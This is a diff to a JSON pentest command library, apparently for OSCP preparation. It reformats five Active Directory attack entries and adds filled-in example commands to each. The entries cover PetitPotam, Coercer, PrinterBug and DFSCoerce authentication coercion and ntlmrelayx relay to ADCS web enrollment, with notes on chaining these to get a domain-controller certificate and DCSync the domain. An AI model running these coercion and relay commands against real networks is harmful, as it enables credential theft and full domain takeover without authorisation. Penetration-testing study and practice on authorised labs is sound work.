@@ -8,30 +8,75 @@
       "category": "exploitation",
       "subcategory": "active-directory",
       "variables": [
-        {"name": "<USERNAME>", "description": "Domain username (optional for null session)", "example": "user", "required": false},
-        {"name": "<PASSWORD>", "description": "User password", "required": false},
-        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": false},
-        {"name": "<LISTENER_IP>", "description": "Attacker IP running ntlmrelayx/responder", "example": "192.168.50.100", "required": true},
-        {"name": "<TARGET_IP>", "description": "Target server to coerce", "example": "192.168.50.70", "required": true}
+        {
+          "name": "<USERNAME>",
+          "description": "Domain username (optional for null session)",
+          "example": "user",
+          "required": false
+        },
+        {
+          "name": "<PASSWORD>",
+          "description": "User password",
+          "required": false
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain name",
+          "example": "corp.local",
+          "required": false
+        },
+        {
+          "name": "<LISTENER_IP>",
+          "description": "Attacker IP running ntlmrelayx/responder",
+          "example": "192.168.50.100",
+          "required": true
+        },
+        {
+          "name": "<TARGET_IP>",
+          "description": "Target server to coerce",
+          "example": "192.168.50.70",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "COERCION", "NTLM_RELAY", "PETITPOTAM", "LINUX", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "COERCION",
+        "NTLM_RELAY",
+        "PETITPOTAM",
+        "LINUX",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "-u": "Username for authentication (optional - try null session first)",
         "-p": "Password for authentication",
         "-d": "Domain name",
         "-pipe": "Named pipe to use (default: lsarpc)"
       },
-      "success_indicators": ["Coercing", "authentication received", "Authenticated"],
-      "failure_indicators": ["Connection refused", "STATUS_ACCESS_DENIED"],
-      "next_steps": ["ntlmrelayx-adcs", "ntlmrelayx-ldap"],
-      "alternatives": ["coercer-coerce", "printerbug-trigger"],
+      "success_indicators": [
+        "Coercing",
+        "authentication received",
+        "Authenticated"
+      ],
+      "failure_indicators": [
+        "Connection refused",
+        "STATUS_ACCESS_DENIED"
+      ],
+      "next_steps": [
+        "ntlmrelayx-adcs",
+        "ntlmrelayx-ldap"
+      ],
+      "alternatives": [
+        "coercer-coerce",
+        "printerbug-trigger"
+      ],
       "prerequisites": [],
       "troubleshooting": {
         "STATUS_ACCESS_DENIED": "Try with credentials or different target",
         "Connection refused": "Target port 445 not accessible"
       },
-      "notes": "PETITPOTAM ATTACK:\nExploits EfsRpcOpenFileRaw to force target to authenticate to attacker.\n\nUSE CASES:\n1. ADCS Relay (ESC8): Coerce DC to attacker → relay to CA → get DC cert\n2. Unconstrained Delegation: Coerce to host with unconstrained delegation to capture TGT\n3. LDAP Relay: Relay to DC for RBCD or shadow credentials\n\nSETUP FOR ADCS RELAY:\n# Terminal 1: Start relay\nntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n\n# Terminal 2: Trigger coercion\npython3 PetitPotam.py <attacker_ip> <dc_ip>\n\nNULL SESSION:\nTry without credentials first - many DCs allow unauthenticated coercion.\n\nOSCP TIP:\nPetitPotam + ADCS relay is a high-impact attack chain for domain compromise.",
-      "oscp_relevance": "high"
+      "notes": "PETITPOTAM ATTACK:\nExploits EfsRpcOpenFileRaw to force target to authenticate to attacker.\n\nUSE CASES:\n1. ADCS Relay (ESC8): Coerce DC to attacker \u2192 relay to CA \u2192 get DC cert\n2. Unconstrained Delegation: Coerce to host with unconstrained delegation to capture TGT\n3. LDAP Relay: Relay to DC for RBCD or shadow credentials\n\nSETUP FOR ADCS RELAY:\n# Terminal 1: Start relay\nntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n\n# Terminal 2: Trigger coercion\npython3 PetitPotam.py <attacker_ip> <dc_ip>\n\nNULL SESSION:\nTry without credentials first - many DCs allow unauthenticated coercion.\n\nOSCP TIP:\nPetitPotam + ADCS relay is a high-impact attack chain for domain compromise.",
+      "oscp_relevance": "high",
+      "filled_example": "python3 PetitPotam.py -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' 192.168.50.100 192.168.50.70"
     },
     {
       "id": "coercer-coerce",
@@ -41,13 +86,44 @@
       "category": "exploitation",
       "subcategory": "active-directory",
       "variables": [
-        {"name": "<USERNAME>", "description": "Domain username", "example": "user", "required": true},
-        {"name": "<PASSWORD>", "description": "User password", "required": true},
-        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true},
-        {"name": "<LISTENER_IP>", "description": "Attacker listener IP", "example": "192.168.50.100", "required": true},
-        {"name": "<TARGET_IP>", "description": "Target server IP", "example": "192.168.50.70", "required": true}
+        {
+          "name": "<USERNAME>",
+          "description": "Domain username",
+          "example": "user",
+          "required": true
+        },
+        {
+          "name": "<PASSWORD>",
+          "description": "User password",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain name",
+          "example": "corp.local",
+          "required": true
+        },
+        {
+          "name": "<LISTENER_IP>",
+          "description": "Attacker listener IP",
+          "example": "192.168.50.100",
+          "required": true
+        },
+        {
+          "name": "<TARGET_IP>",
+          "description": "Target server IP",
+          "example": "192.168.50.70",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "COERCION", "NTLM_RELAY", "MULTI_PROTOCOL", "LINUX", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "COERCION",
+        "NTLM_RELAY",
+        "MULTI_PROTOCOL",
+        "LINUX",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "coerce": "Perform coercion attacks",
         "-u": "Username for authentication",
@@ -58,16 +134,28 @@
         "--filter-method": "Test only specific methods",
         "--filter-protocol": "Test only specific protocols (MS-RPRN, MS-EFSR, etc.)"
       },
-      "success_indicators": ["Coercion worked!", "received authentication"],
-      "failure_indicators": ["All methods failed", "Connection refused"],
-      "next_steps": ["ntlmrelayx-adcs"],
-      "alternatives": ["petitpotam-coerce", "printerbug-trigger"],
+      "success_indicators": [
+        "Coercion worked!",
+        "received authentication"
+      ],
+      "failure_indicators": [
+        "All methods failed",
+        "Connection refused"
+      ],
+      "next_steps": [
+        "ntlmrelayx-adcs"
+      ],
+      "alternatives": [
+        "petitpotam-coerce",
+        "printerbug-trigger"
+      ],
       "prerequisites": [],
       "troubleshooting": {
         "All methods failed": "Target may be patched or methods blocked"
       },
       "notes": "COERCER ADVANTAGE:\nTests ALL known coercion methods automatically:\n- MS-EFSR (PetitPotam)\n- MS-RPRN (PrinterBug/SpoolSample)\n- MS-FSRVP (ShadowCoerce)\n- MS-DFSNM (DFSCoerce)\n\nThis is better than running individual tools.\n\nUSE CASE:\nWhen PetitPotam is patched, Coercer will find alternative working methods.",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "coercer coerce -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' -l 192.168.50.100 -t 192.168.50.70"
     },
     {
       "id": "printerbug-trigger",
@@ -77,24 +165,67 @@
       "category": "exploitation",
       "subcategory": "active-directory",
       "variables": [
-        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true},
-        {"name": "<USERNAME>", "description": "Domain username", "example": "user", "required": true},
-        {"name": "<PASSWORD>", "description": "User password", "required": true},
-        {"name": "<TARGET_IP>", "description": "Target server with Print Spooler", "example": "192.168.50.70", "required": true},
-        {"name": "<LISTENER_IP>", "description": "Attacker listener IP", "example": "192.168.50.100", "required": true}
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain name",
+          "example": "corp.local",
+          "required": true
+        },
+        {
+          "name": "<USERNAME>",
+          "description": "Domain username",
+          "example": "user",
+          "required": true
+        },
+        {
+          "name": "<PASSWORD>",
+          "description": "User password",
+          "required": true
+        },
+        {
+          "name": "<TARGET_IP>",
+          "description": "Target server with Print Spooler",
+          "example": "192.168.50.70",
+          "required": true
+        },
+        {
+          "name": "<LISTENER_IP>",
+          "description": "Attacker listener IP",
+          "example": "192.168.50.100",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "COERCION", "PRINT_SPOOLER", "NTLM_RELAY", "LINUX", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "COERCION",
+        "PRINT_SPOOLER",
+        "NTLM_RELAY",
+        "LINUX",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {},
-      "success_indicators": ["Got Handle", "Triggered RPC"],
-      "failure_indicators": ["Print Spooler not running", "Access denied"],
-      "next_steps": ["ntlmrelayx-adcs"],
-      "alternatives": ["petitpotam-coerce", "coercer-coerce"],
+      "success_indicators": [
+        "Got Handle",
+        "Triggered RPC"
+      ],
+      "failure_indicators": [
+        "Print Spooler not running",
+        "Access denied"
+      ],
+      "next_steps": [
+        "ntlmrelayx-adcs"
+      ],
+      "alternatives": [
+        "petitpotam-coerce",
+        "coercer-coerce"
+      ],
       "prerequisites": [],
       "troubleshooting": {
         "Print Spooler not running": "Service disabled on target - try different method"
       },
       "notes": "PRINTERBUG (MS-RPRN):\nAbuses RpcRemoteFindFirstPrinterChangeNotificationEx to force authentication.\n\nREQUIRES:\n- Print Spooler service running on target (default on most Windows)\n- Valid domain credentials\n\nOLDER BUT RELIABLE:\nPetitPotam may be patched, but PrinterBug often still works.",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "python3 printerbug.py 'corp.local/user:P@ssw0rd123!@192.168.50.70' 192.168.50.100"
     },
     {
       "id": "dfscoerce-trigger",
@@ -104,28 +235,71 @@
       "category": "exploitation",
       "subcategory": "active-directory",
       "variables": [
-        {"name": "<USERNAME>", "description": "Domain username", "example": "user", "required": true},
-        {"name": "<PASSWORD>", "description": "User password", "required": true},
-        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true},
-        {"name": "<LISTENER_IP>", "description": "Attacker listener IP", "example": "192.168.50.100", "required": true},
-        {"name": "<TARGET_IP>", "description": "Target server IP", "example": "192.168.50.70", "required": true}
+        {
+          "name": "<USERNAME>",
+          "description": "Domain username",
+          "example": "user",
+          "required": true
+        },
+        {
+          "name": "<PASSWORD>",
+          "description": "User password",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain name",
+          "example": "corp.local",
+          "required": true
+        },
+        {
+          "name": "<LISTENER_IP>",
+          "description": "Attacker listener IP",
+          "example": "192.168.50.100",
+          "required": true
+        },
+        {
+          "name": "<TARGET_IP>",
+          "description": "Target server IP",
+          "example": "192.168.50.70",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "COERCION", "DFS", "NTLM_RELAY", "LINUX", "OSCP:MEDIUM"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "COERCION",
+        "DFS",
+        "NTLM_RELAY",
+        "LINUX",
+        "OSCP:MEDIUM"
+      ],
       "flag_explanations": {
         "-u": "Username",
         "-p": "Password",
         "-d": "Domain"
       },
-      "success_indicators": ["Successfully triggered", "auth received"],
-      "failure_indicators": ["DFS not available", "Access denied"],
-      "next_steps": ["ntlmrelayx-adcs"],
-      "alternatives": ["petitpotam-coerce", "coercer-coerce"],
+      "success_indicators": [
+        "Successfully triggered",
+        "auth received"
+      ],
+      "failure_indicators": [
+        "DFS not available",
+        "Access denied"
+      ],
+      "next_steps": [
+        "ntlmrelayx-adcs"
+      ],
+      "alternatives": [
+        "petitpotam-coerce",
+        "coercer-coerce"
+      ],
       "prerequisites": [],
       "troubleshooting": {
         "DFS not available": "Target does not have DFS role"
       },
       "notes": "DFSCOERCE:\nAlternative coercion method using Distributed File System.\n\nUSE WHEN:\n- PetitPotam patched\n- Print Spooler disabled\n- Target has DFS role installed",
-      "oscp_relevance": "medium"
+      "oscp_relevance": "medium",
+      "filled_example": "python3 dfscoerce.py -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' 192.168.50.100 192.168.50.70"
     },
     {
       "id": "ntlmrelayx-adcs",
@@ -135,27 +309,55 @@
       "category": "exploitation",
       "subcategory": "active-directory",
       "variables": [
-        {"name": "<CA_IP>", "description": "Certificate Authority IP/hostname", "example": "ca.corp.local", "required": true},
-        {"name": "<TEMPLATE>", "description": "Certificate template name", "example": "DomainController", "required": true}
+        {
+          "name": "<CA_IP>",
+          "description": "Certificate Authority IP/hostname",
+          "example": "ca.corp.local",
+          "required": true
+        },
+        {
+          "name": "<TEMPLATE>",
+          "description": "Certificate template name",
+          "example": "DomainController",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "NTLM_RELAY", "ADCS", "ESC8", "LINUX", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "NTLM_RELAY",
+        "ADCS",
+        "ESC8",
+        "LINUX",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "-t": "Target URL for relay (CA web enrollment)",
         "-smb2support": "Enable SMB2 support for incoming connections",
         "--adcs": "Enable ADCS relay mode",
         "--template": "Certificate template to request"
       },
-      "success_indicators": ["Certificate saved", "Base64 certificate"],
-      "failure_indicators": ["Template not found", "Access denied"],
-      "next_steps": ["certipy-auth"],
+      "success_indicators": [
+        "Certificate saved",
+        "Base64 certificate"
+      ],
+      "failure_indicators": [
+        "Template not found",
+        "Access denied"
+      ],
+      "next_steps": [
+        "certipy-auth"
+      ],
       "alternatives": [],
-      "prerequisites": ["petitpotam-coerce"],
+      "prerequisites": [
+        "petitpotam-coerce"
+      ],
       "troubleshooting": {
         "Template not found": "Verify template name from CA configuration",
         "NTLM not allowed": "CA configured for Kerberos only"
       },
-      "notes": "ADCS RELAY (ESC8):\nRelay machine account authentication to CA to get certificate.\n\nATTACK FLOW:\n1. Start ntlmrelayx targeting CA web enrollment\n2. Trigger coercion with PetitPotam/Coercer/PrinterBug\n3. Relay captures DC$ auth → requests cert as DC$\n4. Use cert with certipy auth to get DC hash\n\nREQUIRES:\n- CA web enrollment enabled (HTTP)\n- NTLM authentication allowed on CA\n- Template that allows machine enrollment (e.g., DomainController)\n\nDC COMPROMISE:\nWith DC cert, you can DCSync entire domain.",
-      "oscp_relevance": "high"
+      "notes": "ADCS RELAY (ESC8):\nRelay machine account authentication to CA to get certificate.\n\nATTACK FLOW:\n1. Start ntlmrelayx targeting CA web enrollment\n2. Trigger coercion with PetitPotam/Coercer/PrinterBug\n3. Relay captures DC$ auth \u2192 requests cert as DC$\n4. Use cert with certipy auth to get DC hash\n\nREQUIRES:\n- CA web enrollment enabled (HTTP)\n- NTLM authentication allowed on CA\n- Template that allows machine enrollment (e.g., DomainController)\n\nDC COMPROMISE:\nWith DC cert, you can DCSync entire domain.",
+      "oscp_relevance": "high",
+      "filled_example": "ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
     }
   ]
 }
